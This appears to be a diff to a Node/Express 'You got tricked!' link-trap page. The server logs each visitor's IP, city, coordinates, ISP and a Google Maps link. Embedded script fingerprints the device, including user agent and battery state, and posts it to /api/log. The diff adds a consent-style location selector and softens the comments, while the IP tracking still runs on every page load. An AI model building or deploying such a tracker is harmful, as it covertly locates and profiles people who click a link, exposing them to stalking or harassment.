@@ -64,46 +64,14 @@ app.get('/', async (req, res) => {
   } catch (error) {
     console.log('Error fetching IP data:', error.message);
   }
-res.send(`
-  <div class="region-selector">
-    <h3>Select Your Region</h3>
-  </div>
-`);
-  <p>We use location data to display relevant local content and events.</p>
-  
-  <!-- Action button to trigger the browser prompt -->
-  <button id="detectLocationBtn">Detect My Location</button>
-  
-  <p>Or manually choose your region:</p>
 
-  // Print general location and map link in Railway console
+  // Server console logging
   console.log(`[VISITOR ALERT] IP: ${visitorIp} | Location: ${cityName}, ${countryName} (${lat}, ${lon}) | ISP: ${ispName}`);
   if (lat && lon) {
     console.log(`[APPROX MAP] https://www.google.com/maps?q=${lat},${lon}`);
   }
-<!-- Manual fallback dropdown -->
-  <select id="countrySelect">
-    <option value="IE">Ireland</option>
-    <option value="UK">United Kingdom</option>
-    <option value="US">United States</option>
-  </select>
-</div>
-document.getElementById('detectLocationBtn').addEventListener('click', () => {
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          console.log("User consented to location access.");
-          // Update UI with region data
-        },
-        (error) => {
-          console.log("Location access denied or timed out. Falling back to manual selection.");
-          // Direct user to manual selection dropdown
-        }
-      );
-    }
-  });
 
-  // Send HTML page with embedded script for client-side device checks
+  // Send HTML page with embedded script for client-side interactions & metrics
   res.send(`
     <!DOCTYPE html>
     <html lang="en">
@@ -126,7 +94,7 @@ document.getElementById('detectLocationBtn').addEventListener('click', () => {
           flex-direction: column;
           justify-content: center;
           align-items: center;
-          height: 100vh;
+          min-height: 100vh;
           margin: 0;
           font-family: Arial, sans-serif;
           text-align: center;
@@ -144,6 +112,12 @@ document.getElementById('detectLocationBtn').addEventListener('click', () => {
           color: #666;
           font-size: 18px;
         }
+        .region-selector {
+          margin-top: 20px;
+          padding: 15px;
+          border: 1px solid #ccc;
+          border-radius: 5px;
+        }
       </style>
     </head>
     <body>
@@ -151,7 +125,32 @@ document.getElementById('detectLocationBtn').addEventListener('click', () => {
       <h1>You got tricked!</h1>
       <p>Greetings to someone connecting via <strong>${ispName}</strong> in <strong>${cityName}, ${countryName}</strong>.</p>
 
+      <div class="region-selector">
+        <h3>Select Your Region</h3>
+        <p>We use location data to display relevant local content and events.</p>
+        <button id="detectLocationBtn">Detect My Location</button>
+        <p>Or manually choose your region:</p>
+        <select id="countrySelect">
+          <option value="IE">Ireland</option>
+          <option value="UK">United Kingdom</option>
+          <option value="US">United States</option>
+        </select>
+      </div>
+
       <script>
+        document.getElementById('detectLocationBtn').addEventListener('click', () => {
+          if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                console.log("User consented to location access:", position.coords.latitude, position.coords.longitude);
+              },
+              (error) => {
+                console.log("Location access denied or timed out.");
+              }
+            );
+          }
+        });
+
         async function collectDeviceMetrics() {
           const payload = {
             userAgent: navigator.userAgent,
@@ -167,18 +166,16 @@ document.getElementById('detectLocationBtn').addEventListener('click', () => {
             isCharging: null
           };
 
-          // Read battery status if supported by browser
           if ('getBattery' in navigator) {
             try {
               const battery = await navigator.getBattery();
               payload.batteryLevel = Math.round(battery.level * 100);
               payload.isCharging = battery.charging;
             } catch (e) {
-              // Ignore if blocked or unavailable
+              // Ignore if restricted by browser
             }
           }
 
-          // Send telemetry back to server
           fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
